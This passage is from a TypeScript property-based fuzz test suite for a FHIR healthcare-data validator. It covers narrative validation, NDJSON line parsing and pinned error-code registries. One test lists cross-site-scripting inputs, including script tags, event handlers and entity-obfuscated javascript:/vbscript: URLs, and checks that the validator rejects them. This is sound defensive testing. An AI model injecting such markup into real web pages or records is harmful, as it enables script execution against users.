          // A throw here fails the property: validation is total over any narrative.
          const result = validateResource(resource, { mode });
          const issues = result.issues;
          for (const issue of issues) expect(codes.has(issue.code)).toBe(true);
          // Every narrative finding sits at the div and says nothing of what is in it.
          for (const issue of issues.filter((i) => i.code.startsWith("NARRATIVE_"))) {
            expect(issue.expression).toBe("Patient.text.div");
          }
          const surface = JSON.stringify(issues) + serializeResource(result.toOperationOutcome());
          expect(surface).not.toContain(NARRATIVE_SENTINEL);
          // The narrative is kept exactly as written.
          expect(serializeResource(resource)).toBe(text);
        },
      ),
      RUN_CONFIG,
    );
  });

  it("markup carrying a script, a handler or a script URL is never reported clean", () => {
    const active = fc
      .tuple(
        fc.array(fc.constantFrom("<p>x</p>", "<b>y</b>", " ", "<br/>"), { maxLength: 8 }),
        fc.constantFrom(
          "<script>1</script>",
          "<SCRIPT/>",
          "<Script>1</Script>",
          '<span onclick="1">x</span>',
          '<img src="#a" onError="1"/>',
          '<a href="javascript:1">x</a>',
          '<a href="\tJAVASCRIPT:1">x</a>',
          '<area href="vbscript:1"/>',
          '<a href="java&#9;script:1">x</a>',
          '<a href="java&#10;script:1">x</a>',
          '<a href="java&#13;script:1">x</a>',
          '<area href="jav&#x9;ascript:1"/>',
          '<a href="&#1;v&#xA;bscr&#13;ipt:1">x</a>',
          "<iframe/>",
          "<embed/>",
          "<applet/>",
        ),
        fc.array(fc.constantFrom("<p>x</p>", "<i>z</i>", " "), { maxLength: 8 }),
      )
      .map(
        ([before, hazard, after]) =>
          `<div xmlns="http://www.w3.org/1999/xhtml">${before.join("")}${hazard}${after.join("")}</div>`,
      );
    fc.assert(
      fc.property(active, (div) => {
        const { resource } = parseResource(
          JSON.stringify({ resourceType: "Patient", text: { status: "generated", div } }),
        );
        const result = validateResource(resource);
        expect(result.valid).toBe(false);
        expect(result.issues.map((i) => i.code)).toContain("NARRATIVE_ACTIVE_CONTENT");
      }),
      RUN_CONFIG,
    );
  });
});

// ── NDJSON contract ──────────────────────────────────────────────────────────────────────────────

describe("fuzz: NDJSON, parseNdjsonLine isolates every failure and never throws", () => {
  it("a malformed / hostile line yields a value-free error record, never a throw", () => {
    const anyLine = fc.oneof(
      fc.string({ minLength: 0, maxLength: 200, unit: "binary" }),
      mutatedJsonFixture(),
      truncatedFixture(JSON_FIXTURES),
      // A deeply-nested line, must isolate, not overflow.
      fc.integer({ min: 300, max: 5000 }).map((d) => "[".repeat(d) + "]".repeat(d)),
    );
    fc.assert(
      fc.property(anyLine, fc.integer({ min: 1, max: 1_000_000 }), (line, lineNo) => {
        // Newlines can't appear inside a single NDJSON line; strip them so the unit is one line.
        const oneLine = line.replaceAll(/[\r\n]/g, " ");
        let record: ReturnType<typeof parseNdjsonLine> | undefined;
        expect(() => {
          record = parseNdjsonLine(oneLine, lineNo);
        }).not.toThrow();
        // Exactly one of resource / error (or neither, for a blank line), never both, never a throw.
        if (record?.error) {
          expect(Object.values(NDJSON_ERROR_CODES)).toContain(record.error.code);
          expect(record.error.line).toBe(lineNo);
          expect(record.resource).toBeUndefined();
        }
      }),
      RUN_CONFIG,
    );
  });
});

describe("fuzz: registries stay pinned (a silent code rename would be caught here)", () => {
  it("FATAL_CODES is exactly the documented set (Phase 1 + the P11 depth-bound guard)", () => {
    expect(Object.keys(FATAL_CODES).sort()).toEqual(
      ["MALFORMED_JSON", "MAX_DEPTH_EXCEEDED", "PRIMITIVE_EXTENSION_MISALIGNED"].sort(),
    );
  });

  it("XML_FATAL_CODES is exactly the documented set", () => {
    expect(Object.keys(XML_FATAL_CODES).sort()).toEqual(
      ["MALFORMED_XML", "DTD_FORBIDDEN", "UNDEFINED_ENTITY", "MAX_DEPTH_EXCEEDED"].sort(),
    );
  });
});
